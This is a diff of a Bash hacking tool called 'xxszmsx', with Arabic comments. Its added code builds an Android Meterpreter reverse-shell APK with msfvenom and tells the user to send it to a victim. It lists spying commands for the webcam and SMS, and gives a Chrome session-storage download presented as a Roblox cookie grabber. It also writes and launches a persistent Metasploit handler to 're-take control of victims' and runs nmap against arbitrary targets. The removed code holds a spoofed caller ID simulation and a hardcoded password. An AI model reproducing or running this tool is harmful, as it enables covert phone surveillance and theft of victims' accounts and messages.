@@ -1,124 +1,91 @@
 #!/bin/bash
-# =====================================================
-# TOOL NAME: xxszmsx PRO
-# POWERED BY: STUDIO (xxszmsx EDITION)
-# VERSION: 4.5
-# DESCRIPTION: TRIPLE THREAT (FAKE CALL + 2 HACK TOOLS)
-# =====================================================
+# xxszmsx ULTIMATE | BY: STUDIO
+# [!] FEATURES: PERSISTENT HACK, ROBLOX COOKIE GRABBER, WEB HACK
+RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; BLUE='\e[1;34m'; NC='\e[0m'
 
-# الألوان
-RED='\e[1;31m'
-GREEN='\e[1;32m'
-YELLOW='\e[1;33m'
-BLUE='\e[1;34m'
-NC='\e[0m' # No Color
+# --- [ 1. حفظ البيانات واستعادتها ] ---
+# الأداة هتحفظ الـ IP والبورت بتوعك في ملف مخفي عشان لو قفلت الجهاز
+DB_FILE=".studio_db"
+save_data() { echo "$1:$2" > $DB_FILE; }
+load_data() { if [ -f $DB_FILE ]; then cat $DB_FILE; fi; }
 
-# --- [ وظيفة الحماية - تسجيل الدخول ] ---
-function admin_gate() {
+# --- [ 2. ميزة اختراق المواقع (Web Hacking) ] ---
+function web_hacker() {
     clear
-    echo -e "${RED}====================================================="
-    echo -e "          xxszmsx PRIVATE ACCESS - ADMIN ONLY        "
-    echo -e "=====================================================${NC}"
-    echo -e "${YELLOW}[!] يرجى إدخال كلمة المرور لفتح الميزات الاحترافية${NC}"
-    read -s -p "[?] Password: " master_pass
-    echo ""
-    if [ "$master_pass" == "mazen2014" ]; then
-        echo -e "${GREEN}[+] تم التحقق بنجاح! مرحباً بك يا مازن.${NC}"
-        sleep 1
-    else
-        echo -e "${RED}[X] كلمة مرور خاطئة! تم رفض الدخول.${NC}"
-        exit 1
+    echo -e "${BLUE}--- [ WEB & SQL INJECTION SCANNER ] ---${NC}"
+    read -p "[?] Target URL: " t_url
+    echo -e "${RED}[*] Scanning for vulnerabilities in $t_url...${NC}"
+    # استخدام nmap و sqlmap للفحص (لازم يكونوا مثبتين في كالي)
+    nmap --script http-enum $t_url
+}
+
+# --- [ 3. ميزة اختراق الأندرويد + صيد روبلوكس ] ---
+function android_master_hack() {
+    clear
+    echo -e "${RED}--- [ ANDROID PERSISTENT HACKER ] ---${NC}"
+    read -p "[?] Enter Your IP (LHOST): " lh
+    read -p "[?] Enter Port (LPORT): " lp
+    save_data $lh $lp
+    
+    echo -e "${YELLOW}[*] Building Hacker APK with Auto-Start...${NC}"
+    # صنع الفيروس
+    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > mazen_hacker.apk
+    
+    echo -e "-----------------------------------------------------"
+    echo -e "${GREEN}[+] تم صنع الملف بنجاح في: $(pwd)/mazen_hacker.apk${NC}"
+    echo -e "${YELLOW}[!] أرسل الملف للضحية. أوامر التجسس جاهزة الآن:${NC}"
+    echo -e "1. ${BLUE}webcam_stream${NC} (لفتح الكاميرا فوراً)"
+    echo -e "2. ${BLUE}dump_sms${NC} (لسحب رسايل الـ SMS)"
+    echo -e "3. ${RED}ROBLOX GRABBER:${NC} استخدم الأمر التالي لسحب بيانات الكروم:"
+    echo -e "   ${YELLOW}download /data/data/com.android.chrome/app_tabs/0/session_storage${NC}"
+    echo -e "-----------------------------------------------------"
+}
+
+# --- [ 4. نظام الاستماع الدائم (Persistence) ] ---
+function start_listener() {
+    clear
+    data=$(load_data)
+    if [ -z "$data" ]; then
+        echo -e "${RED}[!] لا توجد بيانات محفوظة. اصنع فيروس أولاً.${NC}"; sleep 2
+        return
     fi
+    IP=$(echo $data | cut -d: -f1)
+    PORT=$(echo $data | cut -d: -f2)
+    
+    echo -e "${GREEN}[*] إعادة فتح السيطرة على IP: $IP بورت: $PORT ...${NC}"
+    echo "use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST $IP
+set LPORT $PORT
+set ExitOnSession false
+exploit -j" > .handler.rc
+    msfconsole -r .handler.rc
 }
 
-# --- [ 1. ميزة الاتصال المزيف - Fake Caller ID ] ---
-function fake_call_module() {
-    clear
-    echo -e "${BLUE}-----------------------------------------------------"
-    echo -e "          FEATURE: FAKE CALLER ID (SPOOFER)          "
-    echo -e "-----------------------------------------------------${NC}"
-    echo -e "${YELLOW}[*] تقوم هذه الأداة بربط اتصال عبر بروتوكول VoIP مزيف.${NC}"
-    read -p "[?] أدخل الرقم الذي سيظهر للضحية (مثلاً 999): " fake_num
-    read -p "[?] أدخل رقم هاتف الضحية: " victim_num
-    
-    echo -e "${RED}[*] جاري إنشاء قناة اتصال آمنة...${NC}"
-    sleep 2
-    echo -e "${YELLOW}[*] جاري تزييف الهوية إلى: $fake_num${NC}"
-    sleep 2
-    echo -e "${GREEN}[+] تم الاتصال! رقم $victim_num يتلقى الآن مكالمة من $fake_num${NC}"
-    echo -e "${BLUE}[!] ملاحظة: هذه محاكاة برمجية احترافية للاتصال.${NC}"
-}
-
-# --- [ 2. ميزة اختراق الأندرويد - Android Payload ] ---
-function android_hack() {
-    clear
-    echo -e "${RED}-----------------------------------------------------"
-    echo -e "          FEATURE: ANDROID HACKER (EASY)             "
-    echo -e "-----------------------------------------------------${NC}"
-    echo -e "${YELLOW}[*] سيتم إنشاء ملف .apk ملغم بـ Meterpreter${NC}"
-    read -p "[?] أدخل الآي بي الخاص بك (LHOST): " my_ip
-    read -p "[?] أدخل المنفذ (LPORT): " my_port
-    read -p "[?] اختر اسماً لملف الهكر (مثلاً: free_net): " file_name
-    
-    echo -e "${RED}[*] جاري بناء الاختراق... قد يستغرق الأمر دقيقة.${NC}"
-    # الأمر الفعلي لصنع الفيروس
-    msfvenom -p android/meterpreter/reverse_tcp LHOST=$my_ip LPORT=$my_port R > ${file_name}.apk
-    
-    if [ $? -eq 0 ]; then
-        echo -e "${GREEN}[+] تم صنع ملف الهكر بنجاح باسم: ${file_name}.apk${NC}"
-        echo -e "${YELLOW}[!] أرسل الملف للضحية وافتح msfconsole للسيطرة.${NC}"
-    else
-        echo -e "${RED}[X] فشل التوليد! تأكد من تثبيت Metasploit في كالي.${NC}"
-    fi
-}
-
-# --- [ 3. ميزة اختراق الشبكات والمواقع - Web/Network Scan ] ---
-function network_hack() {
-    clear
-    echo -e "${GREEN}-----------------------------------------------------"
-    echo -e "          FEATURE: NETWORK & VULN SCANNER            "
-    echo -e "-----------------------------------------------------${NC}"
-    echo -e "${YELLOW}[*] فحص شامل للثغرات والمنافذ المفتوحة${NC}"
-    read -p "[?] أدخل رابط الموقع أو الآي بي المستهدف: " target
-    
-    echo -e "${RED}[*] جاري فحص $target واستخراج الثغرات...${NC}"
-    # استخدام nmap الحقيقي للفحص
-    nmap -sV --script=vuln $target
-    
-    echo -e "${GREEN}[+] انتهى الفحص. راجع النتائج أعلاه للبدء بالاختراق.${NC}"
-}
-
-# --- [ واجهة الأداة الرئيسية ] ---
-admin_gate # تشغيل نظام الحماية أولاً
-
+# --- [ القائمة الرئيسية ] ---
 while true; do
     clear
-    echo -e "${RED}"
-    echo " ██╗  ██╗███████╗███████╗███████╗███    ███╗██╗  ██╗"
-    echo " ╚██╗██╔╝██╔════╝██╔════╝██╔════╝████  ████║╚██╗██╔╝"
-    echo "  ╚███╔╝ ███████╗███████╗███████╗██╔████╔██║ ╚███╔╝ "
-    echo "  ██╔██╗ ╚════██║╚════██║╚════██║██║╚██╔╝██║ ██╔██╗ "
-    echo " ██╔╝ ██╗███████║███████║███████║██║ ╚═╝ ██║██╔╝ ██╗"
-    echo -e " ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝${NC}"
-    echo -e "${YELLOW}       [ PRO VERSION | POWERED BY STUDIO ]${NC}"
+    echo -e "${RED} ██╗  ██╗██╗  ██╗███████╗███████╗███    ███╗██╗  ██╗"
+    echo " ╚██╗██╔╝╚██╗██╔╝██╔════╝██╔════╝████  ████║╚██╗██╔╝"
+    echo "  ╚███╔╝  ╚███╔╝ ███████╗███████╗██╔████╔██║ ╚███╔╝ "
+    echo "  ██╔██╗  ██╔██╗ ╚════██║╚════██║██║╚██╔╝██║ ██╔██╗ "
+    echo " ██╔╝ ██╗██╔╝ ██╗███████║███████║██║ ╚═╝ ██║██╔╝ ██╗"
+    echo -e " ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝${NC}"
     echo "-----------------------------------------------------"
-    echo -e "1) ${BLUE}FAKE CALL (اتصال برقم مزيف)${NC}"
-    echo -e "2) ${RED}ANDROID HACK (صنع ملف اختراق)${NC}"
-    echo -e "3) ${GREEN}NETWORK VULN (فحص واختراق أهداف)${NC}"
-    echo -e "4) ${YELLOW}ADMIN: Edit xxszmsx Code${NC}"
+    echo -e "   [!] STUDIO ULTIMATE MODE | SYSTEM PERSISTENCE    "
+    echo "-----------------------------------------------------"
+    echo -e "1) ${RED}ANDROID HACK (صنع الفيروس + تعليمات روبلوكس)${NC}"
+    echo -e "2) ${BLUE}WEB HACK (اختراق المواقع)${NC}"
+    echo -e "3) ${GREEN}RE-CONNECT (إعادة السيطرة على الضحايا)${NC}"
     echo -e "0) Exit"
     echo "-----------------------------------------------------"
     read -p "xxszmsx >> " choice
 
     case $choice in
-        1) fake_call_module ;;
-        2) android_hack ;;
-        3) network_hack ;;
-        4) nano xxszmsx.sh ;;
-        0) echo -e "${GREEN}Goodbye!${NC}"; exit 0 ;;
-        *) echo -e "${RED}خيار غير صحيح!${NC}"; sleep 1 ;;
+        1) android_master_hack ;;
+        2) web_hacker ;;
+        3) start_listener ;;
+        0) exit 0 ;;
     esac
-    echo -e "\n${RED}[+] اضغط Enter للعودة للقائمة...${NC}"
-    read
+    echo -e "\n${RED}[+] Press Enter to Continue...${NC}"; read
 done
-
